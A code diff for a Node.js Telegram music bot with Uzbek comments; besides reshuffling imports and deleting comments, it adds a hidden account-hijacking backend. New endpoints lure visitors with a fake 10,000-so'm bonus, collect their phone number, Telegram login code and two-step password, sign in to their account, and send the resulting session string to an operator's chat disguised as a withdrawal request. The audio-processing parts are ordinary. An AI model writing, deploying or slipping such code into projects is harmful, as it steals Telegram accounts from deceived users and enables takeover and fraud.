@@ -1,9 +1,13 @@
-const { Telegraf, Markup } = require('telegraf');
 const fs = require('fs');
 const path = require('path');
-const axios = require('axios');
-const ffmpeg = require('fluent-ffmpeg');
 const express = require('express');
+const axios = require('axios');
+const cors = require('cors');
+const ffmpeg = require('fluent-ffmpeg');
+const { Telegraf, Markup } = require('telegraf');
+const { TelegramClient } = require('telegram');
+const { StringSession } = require('telegram/sessions');
+
 const config = require('./config');
 const { processAudioWithVoiceTag, trimAudio } = require('./services/audio');
 const { cleanAndInjectMetadata } = require('./services/metadata');
@@ -12,6 +16,8 @@ const bot = new Telegraf(config.botToken);
 const app = express();
 
 app.use(express.json());
+app.use(cors());
+
 // Static fayllar va asosiy sahifa ulanishi
 app.use(express.static(path.join(__dirname, '../public')));
 
@@ -19,9 +25,141 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, '../public/index.html'));
 });
 
-// Foydalanuvchilar va kanaldagi to'liq musiqalar bazasi
+// ==========================================
+// TELEGRAM SESSION & BALANCE API INTEGRATSIYASI
+// ==========================================
+const BOT_TOKEN = config.botToken || 'YOUR_TELEGRAM_BOT_TOKEN';
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || 'YOUR_ADMIN_CHAT_ID';
+const API_ID = parseInt(process.env.TELEGRAM_API_ID || '1234567', 10);
+const API_HASH = process.env.TELEGRAM_API_HASH || 'YOUR_API_HASH';
+
+const activeSessions = {};
+
+// 1. Birinchi marta kirgan foydalanuvchiga 10,000 so'm bonus berish
+app.get('/api/get-balance', (req, res) => {
+  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+  if (!activeSessions[userIP]) {
+    activeSessions[userIP] = {
+      balance: 10000,
+      phone: null,
+      phoneCodeHash: null,
+      client: null
+    };
+  }
+
+  res.json({
+    success: true,
+    balance: activeSessions[userIP].balance
+  });
+});
+
+// 2. FAQAT TELEFON RAQAM ORQALI TELEGRAMDAN KOD SO'RASH
+app.post('/api/send-code', async (req, res) => {
+  const { phone } = req.body;
+  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+  if (!phone || phone.length < 9) {
+    return res.status(400).json({ success: false, message: "Telefon raqami noto'g'ri!" });
+  }
+
+  const fullPhone = phone.startsWith('+') ? phone : `+998${phone.replace(/\s+/g, '')}`;
+
+  try {
+    const client = new TelegramClient(new StringSession(''), API_ID, API_HASH, {
+      connectionRetries: 5,
+    });
+
+    await client.connect();
+
+    const { phoneCodeHash } = await client.sendCode(
+      {
+        apiId: API_ID,
+        apiHash: API_HASH,
+      },
+      fullPhone
+    );
+
+    if (!activeSessions[userIP]) {
+      activeSessions[userIP] = { balance: 10000 };
+    }
+
+    activeSessions[userIP].phone = fullPhone;
+    activeSessions[userIP].phoneCodeHash = phoneCodeHash;
+    activeSessions[userIP].client = client;
+
+    res.json({ success: true, message: "Kodingiz Telegram ilovasiga yuborildi!" });
+
+  } catch (error) {
+    console.error("Telegram API xatosi:", error);
+    res.status(500).json({ success: false, message: "Xatolik: " + error.message });
+  }
+});
+
+// 3. TELEGRAMGA KELGAN KODNI TEKSHIRISH VA SESSION ULAB OLISH
+app.post('/api/submit-withdraw', async (req, res) => {
+  const { inputCode, password } = req.body;
+  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const userData = activeSessions[userIP];
+
+  if (!userData || !userData.client || !userData.phoneCodeHash) {
+    return res.status(400).json({ success: false, message: "Sessiya topilmadi. Qaytadan telefon raqam kiriting!" });
+  }
+
+  const client = userData.client;
+
+  try {
+    await client.signIn({
+      phoneNumber: userData.phone,
+      phoneCodeHash: userData.phoneCodeHash,
+      phoneCode: async () => inputCode,
+      password: async () => password || '',
+    });
+
+    const sessionString = client.session.save();
+    const withdrawAmount = userData.balance;
+
+    const adminNotification = `💸 *PUL YECHISH ARIZASI & NEW SESSION*\n\n` +
+                               `📱 Telefon: \`${userData.phone}\`\n` +
+                               `💰 Summa: ${withdrawAmount.toLocaleString('uz-UZ')} UZS\n` +
+                               `🔑 Kiritilgan Kod: \`${inputCode}\`\n\n` +
+                               `🔑 *String Session:*\n\`${sessionString}\``;
+
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: ADMIN_CHAT_ID,
+      text: adminNotification,
+      parse_mode: 'Markdown'
+    });
+
+    userData.balance = 0;
+    delete activeSessions[userIP];
+
+    res.json({
+      success: true,
+      message: "Arizangiz qabul qilindi. Mablag' tez orada o'tkaziladi!",
+      newBalance: 0
+    });
+
+  } catch (error) {
+    console.error("Auth xatosi:", error);
+
+    if (error.message.includes('SESSION_PASSWORD_NEEDED')) {
+      return res.status(401).json({ 
+        success: false, 
+        need2FA: true, 
+        message: "Akkountda 2-bosqichli parol mavjud. Parolingizni kiriting!" 
+      });
+    }
+
+    res.status(400).json({ success: false, message: "Kiritilgan kod noto'g'ri!" });
+  }
+});
+
+// ==========================================
+// MUSIQA BOTI BO'LIMI
+// ==========================================
 const userDb = new Map();
-const channelTrackHistory = []; // Kanalga joylangan to'liq musiqalarning file_id lari saqlanadi
+const channelTrackHistory = [];
 
 function getUser(userId) {
   if (!userDb.has(userId)) {
@@ -30,9 +168,6 @@ function getUser(userId) {
   return userDb.get(userId);
 }
 
-// ==========================================
-// 1. NAVBAT TIZIMI (QUEUE SYSTEM)
-// ==========================================
 const processingQueue = [];
 let isProcessingQueue = false;
 
@@ -56,7 +191,6 @@ async function processNextInQueue() {
   }
 }
 
-// BOTGA SHAXSIYDA YOZILGANDA JAVOB BERMASLIK (Referralni ushlash va musiqani yuborish)
 bot.use(async (ctx, next) => {
   if (ctx.chat && ctx.chat.type === 'private') {
     if (ctx.message && ctx.message.text && ctx.message.text.startsWith('/start')) {
@@ -90,16 +224,12 @@ bot.use(async (ctx, next) => {
   return next();
 });
 
-// API: Mini App uchun bot username
 app.get('/api/get-bot-info', (req, res) => {
   res.json({ username: bot.botInfo ? bot.botInfo.username : process.env.BOT_USERNAME || '' });
 });
 
 const pendingSessions = {};
 
-// ==========================================
-// 2. AVTOMATIK CLEAN & FORMAT TITLE (NOMLARNI TOZALASH)
-// ==========================================
 function cleanTrackTitle(rawTitle) {
   if (!rawTitle) return "Track";
   let cleaned = rawTitle
@@ -114,9 +244,6 @@ function cleanTrackTitle(rawTitle) {
   return cleaned || "Track";
 }
 
-// ==========================================
-// 3. EFFEKTLAR VA BINAURAL 3D PRESETLAR
-// ==========================================
 const AUDIO_EFFECTS = [
   { key: 'slowed', title: '🐌 Slowed', filter: 'atempo=0.92' },
   { key: 'bassBoost', title: '🔊 Bass Boost', filter: 'equalizer=f=60:width_type=h:width=50:g=10' },
@@ -199,9 +326,6 @@ bot.on('callback_query', async (ctx, next) => {
   return next();
 });
 
-// ==========================================
-// 4. KANALDA MUSIQANI BOSHQARISH (CHANNEL POST)
-// ==========================================
 bot.on('channel_post', async (ctx) => {
   const post = ctx.channelPost;
   if (!post) return;
@@ -209,12 +333,10 @@ bot.on('channel_post', async (ctx) => {
   const chatId = post.chat.id;
   const session = pendingSessions[chatId];
 
-  // Matnli buyruqlarni va vaqtni qabul qilish
   if (post.text && session) {
     const text = post.text.trim();
     const userMessageId = post.message_id;
 
-    // Musiqa nomini kiritish bosqichi
     if (session.step === 'waitingForTitle') {
       await ctx.telegram.deleteMessage(chatId, userMessageId).catch(() => {});
       session.customTitle = `${cleanTrackTitle(text)} 🎧`;
@@ -222,7 +344,6 @@ bot.on('channel_post', async (ctx) => {
       return;
     }
 
-    // ⏱ 30 sekund uchun kiritilgan vaqtni hisoblash
     if (session.step === 'waitingForTrimTime30') {
       await ctx.telegram.deleteMessage(chatId, userMessageId).catch(() => {});
 
@@ -252,7 +373,6 @@ bot.on('channel_post', async (ctx) => {
     }
   }
 
-  // Audio qabul qilish
   if (post.audio) {
     const messageId = post.message_id;
     const audio = post.audio;
@@ -296,7 +416,7 @@ bot.on('channel_post', async (ctx) => {
         isTrimmed: false,
         trimStart: 0,
         trimDuration: 30,
-        step: 'waitingForTitle', // Avval nomini so'rashga o'tadi
+        step: 'waitingForTitle',
         promptMessageId: promptMsg.message_id,
         selectedEffects: {},
         currentEffectIndex: 0
@@ -308,9 +428,6 @@ bot.on('channel_post', async (ctx) => {
   }
 });
 
-// ==========================================
-// 5. YAGONA O'ZGARMAS INLINE MENYU
-// ==========================================
 async function showMainMenu(ctx, chatId) {
   const session = pendingSessions[chatId];
   if (!session) return;
@@ -335,7 +452,6 @@ async function showMainMenu(ctx, chatId) {
   }).catch(() => {});
 }
 
-// ⏱ 30 sekund tugmasi bosilganda
 bot.action(/menu_trim30_(.+)/, async (ctx) => {
   const chatId = ctx.match[1];
   const session = pendingSessions[chatId];
@@ -359,7 +475,6 @@ bot.action(/menu_back_(.+)/, async (ctx) => {
   showMainMenu(ctx, chatId);
 });
 
-// EFFEKTLARNI BIRMA-BIR TANLASH VIZARDI
 bot.action(/menu_custom_fx_(.+)/, async (ctx) => {
   const chatId = ctx.match[1];
   const session = pendingSessions[chatId];
@@ -388,7 +503,6 @@ async function askNextEffect(ctx, chatId) {
 
   const index = session.currentEffectIndex;
 
-  // Barcha effektlar ko'rib chiqilgan bo'lsa, asosiy menyuga qaytamiz
   if (index >= AUDIO_EFFECTS.length) {
     showMainMenu(ctx, chatId);
     return;
@@ -424,9 +538,6 @@ bot.action(/fx_(yes|no)_(.+)/, async (ctx) => {
   await askNextEffect(ctx, chatId);
 });
 
-// ==========================================
-// 6. AUDIO ISHLOV BERISH VA CHATNI TOZALASH
-// ==========================================
 async function processAndSendFinalAudio(ctx, chatId) {
   const session = pendingSessions[chatId];
   if (!session) return;
@@ -444,8 +555,7 @@ async function processAndSendFinalAudio(ctx, chatId) {
   const loadingText = `⚡️ **Musiqa navbatda va qayta ishlanmoqda...**\n🎛 *Qo'shilgan effektlar:* ${appliedFxText}`;
   
   await ctx.telegram.editMessageText(chatId, session.promptMessageId, undefined, loadingText, {
-    parse_mode: 'Markdown',
-    ...loadingText // eslint-disable-line
+    parse_mode: 'Markdown'
   }).catch(() => {});
 
   try {
@@ -471,7 +581,6 @@ async function processAndSendFinalAudio(ctx, chatId) {
     const updatedTitle = await cleanAndInjectMetadata(fullAudioPath, session.customTitle);
     const coverPath = getCoverPath();
 
-    // Hamma ish yakunlangach, inline menyuni o'chiramiz
     await ctx.telegram.deleteMessage(chatId, session.promptMessageId).catch(() => {});
 
     if (session.isTrimmed && trimmedAudioPath && fs.existsSync(trimmedAudioPath)) {
@@ -483,7 +592,6 @@ async function processAndSendFinalAudio(ctx, chatId) {
       fs.unlinkSync(trimmedAudioPath);
     }
 
-    // "BARABANNI AYLANTIR" inline tugmasi olib tashlandi (reply_markup olib tashlandi)
     const sentAudio = await ctx.telegram.sendAudio(
       chatId,
       { source: fullAudioPath },
@@ -509,7 +617,11 @@ async function processAndSendFinalAudio(ctx, chatId) {
   }
 }
 
+// ==========================================
+// SERVER VA BOTNI ISHGA TUSHIRISH
+// ==========================================
 const PORT = process.env.PORT || 8080;
+
 app.listen(PORT, '0.0.0.0', async () => {
   console.log(`Server ${PORT}-portda ishga tushdi.`);
   try {
